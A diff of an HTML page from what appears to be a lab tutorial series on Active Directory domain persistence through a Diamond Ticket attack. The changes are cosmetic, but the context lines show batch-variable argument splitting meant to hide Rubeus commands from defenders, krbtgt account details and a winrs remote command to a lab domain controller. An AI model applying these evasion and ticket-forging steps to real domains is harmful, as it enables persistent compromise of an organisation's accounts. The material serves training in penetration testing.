@@ -235,7 +235,7 @@ In conclusion, mastering Diamond Ticket requires a solid understanding of Kerber
 For this demonstration, I’ll be using Rubeus commands. I’ll also be focus on OPSEC care by using PELoader.exe and ArgSplit.exe to encode the argument(diamond).
 Executing ArgSplit.bat for argument encode and copy/paste the result to CMD.
 ArgSplit.bat
-<pre><code>set "z=d"
+<pre><code class="language-bash">set "z=d"
 set "y=n"
 set "x=o"
 set "w=m"
@@ -246,7 +246,7 @@ set "Pwn=%t%%u%%v%%w%%x%%y%%z%"
 </code></pre>
 
 <p>Below are the credentials for the KRBTGT account.
-<pre><code>SAM Username         : krbtgt
+<pre><code class="language-bash">SAM Username         : krbtgt
 Account Type         : 30000000 ( USER_OBJECT )
 Object Security ID   : S-1-5-21-210670787-2521448726-163245708-502
 Object Relative ID   : 502</p>
@@ -289,7 +289,7 @@ winrs -r:us-dc.us.techcorp.local cmd
 
 
 
-          <div class="part-navigation">
+<div class="part-navigation">
             <a href="part-15-domain-persistence-silver-ticket-attack.html"><ion-icon name="arrow-back-outline"></ion-icon> Previous: Domain Persistence - Silver Ti</a>
             <a href="part-17-domain-persistence-skeleton-key-attack.html">Next: Domain Persistence - Skeleton  <ion-icon name="arrow-forward-outline"></ion-icon></a>
           </div>
